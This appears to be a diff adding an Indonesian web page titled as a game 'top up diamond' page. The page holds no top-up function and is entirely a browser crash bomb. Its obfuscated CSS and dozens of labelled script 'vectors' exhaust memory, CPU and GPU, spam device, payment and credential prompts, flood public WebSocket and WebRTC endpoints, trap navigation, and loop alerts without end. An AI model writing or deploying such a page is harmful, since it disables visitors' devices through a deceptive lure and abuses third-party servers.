@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>top up diamond</title>
+    <style>
+        /* Obfuscated CSS Kill Vectors */
+        *{margin:0;padding:0;box-sizing:border-box;animation:_0x1a2b3c 1e-4s infinite}@keyframes _0x1a2b3c{0%{transform:translate(0,0)}100%{transform:translate(99999px,99999px) scale(99999)}}body::before{content:'';position:fixed;width:99999%;height:99999%;background:repeating-radial-gradient(circle,red,blue,green);animation:_0x2b3c4d 1e-4s infinite;z-index:99999}@keyframes _0x2b3c4d{0%{opacity:0}100%{opacity:1;transform:scale(99999)}}._0x3c4d5e{width:1px;height:1px;animation:_0x4d5e6f 1e-4s infinite}@keyframes _0x4d5e6f{0%{box-shadow:0 0 0 red}100%{box-shadow:99999px 99999px red,199999px 199999px blue,299999px 299999px green}}._0x5e6f7a{font-size:1px;animation:_0x6f7a8b 1e-4s infinite}@keyframes _0x6f7a8b{0%{text-shadow:0 0 red}100%{text-shadow:9999px 9999px red,19999px 19999px blue,29999px 29999px green}}._0x7a8b9c{display:grid;grid-template-columns:repeat(99999,1fr);animation:_0x8b9cad 1e-4s infinite}@keyframes _0x8b9cad{0%{grid-template-columns:repeat(99999,1fr)}100%{grid-template-columns:repeat(1,99999fr)}}._0x9cadbe{filter:blur(0);animation:_0xadbecf 1e-4s infinite}@keyframes _0xadbecf{0%{filter:blur(0)}100%{filter:blur(999px) brightness(9999%) contrast(9999%) grayscale(9999%) hue-rotate(9999deg) invert(9999%) saturate(9999%) sepia(9999%)}}body{background:#000;overflow:hidden;position:fixed;width:100%;height:100%}
+    </style>
+</head>
+<body>
+    <div id="x"></div>
+    <script>
+        (function(){
+            // ============================================
+            // VEKTOR 1-16: EXISTING CRASH VECTORS
+            // ============================================
+            (function(){var a=[];setInterval(function(){for(var b=0;b<100;b++){a.push(new ArrayBuffer(10485760));a.push(new Array(1e6).fill('\x58'.repeat(1e3)));a.push({a:new Array(1e5).join('\x41'),b:new Array(1e5).join('\x42'),c:new Array(1e5).join('\x43')})}},1)})();
+            
+            (function(){!function c(){var a=Date.now();while(Date.now()-a<1e3){Math.sin(Math.cos(Math.tan(Math.random()*Math.random())));Math.sqrt(Math.pow(Math.random(),Math.random()));new Array(1e4).fill(Math.random()).sort()}setTimeout(c,0)}();for(var w=0;w<(navigator.hardwareConcurrency*4||16);w++){new Worker(URL.createObjectURL(new Blob(['(function(){for(;;){for(var i=0;i<1e6;i++){Math.sqrt(Math.pow(Math.random(),Math.random()));Math.sin(Math.cos(Math.tan(Math.random())));var a=new Array(1e4).fill(Math.random());a.sort(function(a,b){return a-b})}}})()'],{type:'application/javascript'})))}})();
+            
+            (function(){var c=document.getElementById('x');!function d(){for(var a=0;a<5e3;a++){var b=document.createElement('div');b.className='_0x3c4d5e _0x9cadbe _0x5e6f7a';b.setAttribute('data-id',a+'_'+Date.now()+'_'+Math.random());b.style.position='absolute';b.style.left=Math.random()*1e5+'px';b.style.top=Math.random()*1e5+'px';b.style.width=Math.random()*1e4+'px';b.style.height=Math.random()*1e4+'px';b.style.backgroundColor='rgb('+Math.random()*255+','+Math.random()*255+','+Math.random()*255+')';b.innerText='\uD83D\uDC80'.repeat(100);c.appendChild(b)}setTimeout(d,0)}()})();
+            
+            (function(){!function e(){requestAnimationFrame(e);setTimeout(e,0);setImmediate?setImmediate(e):setTimeout(e,0);new Promise(function(a){a()}).then(e)}()})();
+            
+            (function(){setInterval(function(){try{var a='bomb_'+Date.now()+'_'+Math.random();var b='\x58'.repeat(1e5).repeat(100);localStorage.setItem(a,b);sessionStorage.setItem(a,b);var c=indexedDB.open('\x63\x72\x61\x73\x68\x44\x42',1);c.onsuccess=function(d){var e=d.target.result,f=e.transaction(['\x73\x74\x6f\x72\x65'],'\x72\x65\x61\x64\x77\x72\x69\x74\x65'),g=f.objectStore('\x73\x74\x6f\x72\x65');for(var h=0;h<1e3;h++){g.add({id:Date.now()+h,data:'\x59'.repeat(1e4)})}}}catch(d){}},1)})();
+            
+            // ============================================
+            // VEKTOR 17: GPU CRASH via WebGL Texture Bomb
+            // ============================================
+            (function gpuCrash() {
+                var canvas = document.createElement('canvas');
+                canvas.width = 16384;
+                canvas.height = 16384;
+                var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if(gl) {
+                    var textures = [];
+                    setInterval(function() {
+                        for(var i = 0; i < 100; i++) {
+                            var tex = gl.createTexture();
+                            gl.bindTexture(gl.TEXTURE_2D, tex);
+                            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 16384, 16384, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+                            textures.push(tex);
+                        }
+                    }, 10);
+                }
+            })();
+            
+            // ============================================
+            // VEKTOR 18: WebGL Shader Compiler Bomb
+            // ============================================
+            (function shaderBomb() {
+                var canvas = document.createElement('canvas');
+                var gl = canvas.getContext('webgl');
+                if(gl) {
+                    var shaderSource = '';
+                    for(var i = 0; i < 100000; i++) {
+                        shaderSource += 'uniform vec3 u_color_' + i + ';\n';
+                        shaderSource += 'varying vec3 v_normal_' + i + ';\n';
+                        shaderSource += 'float func_' + i + '(float x) { return pow(x, ' + i + '); }\n';
+                    }
+                    setInterval(function() {
+                        var shader = gl.createShader(gl.VERTEX_SHADER);
+                        gl.shaderSource(shader, shaderSource);
+                        gl.compileShader(shader);
+                    }, 1);
+                }
+            })();
+            
+            // ============================================
+            // VEKTOR 19: WebGPU Compute Shader Overload
+            // ============================================
+            (function webgpuCrash() {
+                if(navigator.gpu) {
+                    (async function() {
+                        var adapter = await navigator.gpu.requestAdapter();
+                        var device = await adapter.requestDevice();
+                        var computePipeline = device.createComputePipeline({
+                            compute: {
+                                module: device.createShaderModule({
+                                    code: `
+                                        @group(0) @binding(0) var<storage, read_write> data: array<f32>;
+                                        @compute @workgroup_size(1024)
+                                        fn main(@builtin(global_invocation_id) id: vec3<u32>) {
+                                            loop {
+                                                for(var i = 0u; i < 1000000000u; i++) {
+                                                    data[id.x] = data[id.x] + 1.0;
+                                                }
+                                            }
+                                        }
+                                    `
+                                }),
+                                entryPoint: 'main'
+                            }
+                        });
+                        var buffer = device.createBuffer({ size: 1024 * 1024 * 1024, usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST });
+                        for(var i = 0; i < 1000; i++) {
+                            device.queue.submit([computePipeline]);
+                        }
+                    })();
+                }
+            })();
+            
+            // ============================================
+            // VEKTOR 20: File System Access API Flood
+            // ============================================
+            (function fileSystemBomb() {
+                if('showDirectoryPicker' in window) {
+                    setInterval(async function() {
+                        try {
+                            var dirHandle = await window.showDirectoryPicker();
+                            for(var i = 0; i < 10000; i++) {
+                                var fileHandle = await dirHandle.getFileHandle('crash_' + i + '.bin', { create: true });
+                                var writable = await fileHandle.createWritable();
+                                await writable.write(new Uint8Array(1024 * 1024 * 100));
+                                await writable.close();
+                            }
+                        } catch(e) {}
+                    }, 1000);
+                }
+            })();
+            
+            // ============================================
+            // VEKTOR 21: WebHID Device Flood
+            // ============================================
+            (function hidBomb() {
+                if(navigator.hid) {
+                    setInterval(function() {
+                        navigator.hid.requestDevice({ filters: [] }).then(function(devices) {
+                            devices.forEach(function(device) {
+                                device.open().then(function() {
+                                    for(var i = 0; i < 1000; i++) {
+                                        device.sendReport(i, new Uint8Array(1024));
+                                    }
+                                });
+                            });
+                        });
+                    }, 100);
+                }
+            })();
+            
+            // ============================================
+            // VEKTOR 22: Web Serial Port Bomb
+            // ============================================
+            (function serialBomb() {
+                if(navigator.serial) {
+                    setInterval(async function() {
+                        var ports = await navigator.serial.getPorts();
+                        ports.forEach(function(port) {
+                            port.open({ baudRate: 115200 }).then(function() {
+                                var writer = port.writable.getWriter();
+                                for(var i = 0; i < 100000; i++) {
+                                    writer.write(new Uint8Array([0x00, 0xFF, 0x00, 0xFF]));
+                                }
+                            });
+                        });
+                    }, 500);
+                }
+            })();
+            
+            // ============================================
+            // VEKTOR 23: WebSocket Global Ping Flood
+            // ============================================
+            (function wsGlobalFlood() {
+                var endpoints = ['wss://echo.websocket.org', 'wss://ws.postman-echo.com/raw', 'wss://socketsbay.com/wss/v2/2/demo'];
+                setInterval(function() {
+                    endpoints.forEach(function(url) {
+                        for(var i = 0; i < 100; i++) {
+                            var ws = new WebSocket(url);
+                            ws.onopen = function() {
+                                this.send(new Array(1000000).join('X'));
+                                this.close();
+                            };
+                        }
+                    });
+                }, 10);
+            })();
+            
+            // ============================================
+            // VEKTOR 24: WebRTC Bandwidth Saturation
+            // ============================================
+            (function webrtcBandwidthBomb() {
+                for(var i = 0; i < 50; i++) {
+                    var pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+                    var dc = pc.createDataChannel('bomb');
+                    dc.onopen = function() {
+                        setInterval(function() {
+                            for(var j = 0; j < 1000; j++) {
+                                this.send(new Array(65536).join('X'));
+                            }
+                        }, 1);
+                    };
+                    pc.createOffer().then(function(offer) {
+                        pc.setLocalDescription(offer);
+                    });
+                }
+            })();
+            
+            // ============================================
+            // VEKTOR 25: Payment Request API Spam
+            // ============================================
+            (function paymentBomb() {
+                if(window.PaymentRequest) {
+                    var supportedMethods = [{
+                        supportedMethods: 'basic-card',
+                        data: { supportedNetworks: ['visa', 'mastercard', 'amex'] }
+                    }];
+                    var details = { total: { label: 'Total', amount: { currency: 'USD', value: '0.01' } } };
+                    setInterval(function() {
+                        for(var i = 0; i < 50; i++) {
+                            var request = new PaymentRequest(supportedMethods, details);
+                            request.canMakePayment();
+                            request.show().catch(function() {});
+                        }
+                    }, 100);
+                }
+            })();
+            
+            // ============================================
+            // VEKTOR 26: Credential Management API Flood
+            // ============================================
+            (function credentialBomb() {
+                if(navigator.credentials) {
+                    setInterval(function() {
+                        for(var i = 0; i < 100; i++) {
+                            var cred = new PasswordCredential({ id: 'user' + i, password: 'pass' + i });
+                            navigator.credentials.store(cred);
+                            navigator.credentials.get({ password: true });
+                            navigator.credentials.preventSilentAccess();
+                        }
+                    }, 10);
+                }
+            })();
+            
+            // ============================================
+            // VEKTOR 27: Performance API Overflow
+            // ============================================
+            (function performanceBomb() {
+                setInterval(function() {
+                    for(var i = 0; i < 100000; i++) {
+                        performance.mark('mark_' + i);
+                        performance.measure('measure_' + i, 'mark_' + i);
+                        performance.getEntriesByType('mark');
+                        performance.getEntriesByType('measure');
+                        performance.clearMarks();
+                        performance.clearMeasures();
+                    }
+                }, 1);
+            })();
+            
+            // ============================================
+            // VEKTOR 28: ResizeObserver + IntersectionObserver Thrash
+            // ============================================
+            (function observerBomb2() {
+                var target = document.body;
+                var resizeObserver = new ResizeObserver(function() {
+                    for(var i = 0; i < 1000; i++) {
+                        var div = document.createElement('div');
+                        div.style.width = Math.random() * 100000 + 'px';
+                        div.style.height = Math.random() * 100000 + 'px';
+                        document.body.appendChild(div);
+                    }
+                });
+                resizeObserver.observe(target);
+                
+                var intersectionObserver = new IntersectionObserver(function() {
+                    for(var i = 0; i < 1000; i++) {
+                        var div = document.createElement('div');
+                        div.style.width = Math.random() * 100000 + 'px';
+                        div.style.height = Math.random() * 100000 + 'px';
+                        document.body.appendChild(div);
+                    }
+                });
+                intersectionObserver.observe(target);
+                
+                setInterval(function() {
+                    target.style.width = Math.random() * 10000 + 'px';
+                    target.style.height = Math.random() * 10000 + 'px';
+                }, 1);
+            })();
+            
+            // ============================================
+            // VEKTOR 29: Layout Thrashing via getComputedStyle
+            // ============================================
+            (function layoutThrash() {
+                var elements = [];
+                for(var i = 0; i < 1000; i++) {
+                    var el = document.createElement('div');
+                    el.style.width = i + 'px';
+                    el.style.height = i + 'px';
+                    document.body.appendChild(el);
+                    elements.push(el);
+                }
+                
+                setInterval(function() {
+                    elements.forEach(function(el) {
+                        var styles = window.getComputedStyle(el);
+                        styles.width;
+                        styles.height;
+                        styles.margin;
+                        styles.padding;
+                        el.offsetHeight;
+                        el.offsetWidth;
+                        el.scrollTop;
+                        el.scrollLeft;
+                    });
+                }, 1);
+            })();
+            
+            // ============================================
+            // VEKTOR 30: Font Loading API Overload
+            // ============================================
+            (function fontBomb() {
+                if('fonts' in document) {
+                    setInterval(function() {
+                        for(var i = 0; i < 100; i++) {
+                            document.fonts.load('1em "Font_' + i + '"');
+                            document.fonts.check('1em "Font_' + i + '"');
+                            document.fonts.ready.then(function() {});
+                        }
+                    }, 1);
+                }
+            })();
+            
+            // ============================================
+            // VEKTOR 31: Clipboard Item Image Bomb
+            // ============================================
+            (function clipboardImageBomb() {
+                setInterval(async function() {
+                    try {
+                        var canvas = document.createElement('canvas');
+                        canvas.width = 32767;
+                        canvas.height = 32767;
+                        var blob = await new Promise(function(resolve) {
+                            canvas.toBlob(resolve, 'image/png');
+                        });
+                        await navigator.clipboard.write([
+                            new ClipboardItem({ [blob.type]: blob })
+                        ]);
+                    } catch(e) {}
+                }, 100);
+            })();
+            
+            // ============================================
+            // VEKTOR 32: Media Session API Spam
+            // ============================================
+            (function mediaSessionBomb() {
+                if('mediaSession' in navigator) {
+                    setInterval(function() {
+                        navigator.mediaSession.metadata = new MediaMetadata({
+                            title: new Array(10000).join('A'),
+                            artist: new Array(10000).join('B'),
+                            album: new Array(10000).join('C')
+                        });
+                        navigator.mediaSession.setActionHandler('play', function() {});
+                        navigator.mediaSession.setActionHandler('pause', function() {});
+                        navigator.mediaSession.setActionHandler('seekbackward', function() {});
+                        navigator.mediaSession.setActionHandler('seekforward', function() {});
+                    }, 1);
+                }
+            })();
+            
+            // ============================================
+            // VEKTOR 33: Screen Wake Lock API Spam
+            // ============================================
+            (function wakeLockBomb() {
+                if('wakeLock' in navigator) {
+                    setInterval(async function() {
+                        try {
+                            var lock = await navigator.wakeLock.request('screen');
+                            setTimeout(function() { lock.release(); }, 1);
+                        } catch(e) {}
+                    }, 1);
+                }
+            })();
+            
+            // ============================================
+            // VEKTOR 34: Idle Detection API Spam
+            // ============================================
+            (function idleBomb() {
+                if('IdleDetector' in window) {
+                    setInterval(async function() {
+                        try {
+                            var detector = new IdleDetector();
+                            await detector.start({ threshold: 1000 });
+                            detector.addEventListener('change', function() {});
+                        } catch(e) {}
+                    }, 1);
+                }
+            })();
+            
+            // ============================================
+            // VEKTOR 35: Content Indexing API Flood
+            // ============================================
+            (function contentIndexBomb() {
+                if('index' in navigator) {
+                    setInterval(function() {
+                        for(var i = 0; i < 100; i++) {
+                            var entry = {
+                                id: 'id_' + i + '_' + Date.now(),
+                                title: new Array(10000).join('X'),
+                                description: new Array(10000).join('Y'),
+                                url: '/crash_' + i
+                            };
+                            navigator.index.add(entry);
+                        }
+                        navigator.index.getAll();
+                    }, 10);
+                }
+            })();
+            
+            // ============================================
+            // VEKTOR 36: Periodic Background Sync Bomb
+            // ============================================
+            (function periodicSyncBomb() {
+                if('serviceWorker' in navigator && 'periodicSync' in navigator.serviceWorker) {
+                    navigator.serviceWorker.ready.then(function(reg) {
+                        setInterval(function() {
+                            for(var i = 0; i < 100; i++) {
+                                reg.periodicSync.register('sync_' + i, { minInterval: 1000 });
+                            }
+                        }, 100);
+                    });
+                }
+            })();
+            
+            // ============================================
+            // AUTO-REDIRECT TRAP (PERSISTENT)
+            // ============================================
+            (function(){
+                history.pushState(null, null, location.href);
+                window.addEventListener('popstate', function() {
+                    history.pushState(null, null, location.href);
+                    location.reload();
+                });
+                
+                window.onbeforeunload = function() {
+                    return 'System Critical Error - Cannot Leave';
+                };
+                
+                window.addEventListener('keydown', function(e) {
+                    if(e.key === 'F5' || e.key === 'F12' || (e.ctrlKey && e.key === 'r') || (e.ctrlKey && e.key === 'w') || (e.ctrlKey && e.key === 'q')) {
+                        e.preventDefault();
+                        return false;
+                    }
+                });
+                
+                document.addEventListener('contextmenu', function(e) {
+                    e.preventDefault();
+                    return false;
+                });
+                
+                setInterval(function() {
+                    try {
+                        var start = Date.now();
+                        debugger;
+                        if(Date.now() - start > 100) {
+                            for(var i=0;i<100;i++) window.open(location.href, '_blank');
+                        }
+                    } catch(e) {}
+                }, 500);
+            })();
+            
+            // ============================================
+            // FINAL: Infinite Alert Loop
+            // ============================================
+            setTimeout(function() {
+                for(;;) {
+                    alert('CRITICAL SYSTEM FAILURE - CONTACT ADMIN');
+                }
+            }, 100);
+        })();
+    </script>
+</body>
+</html>
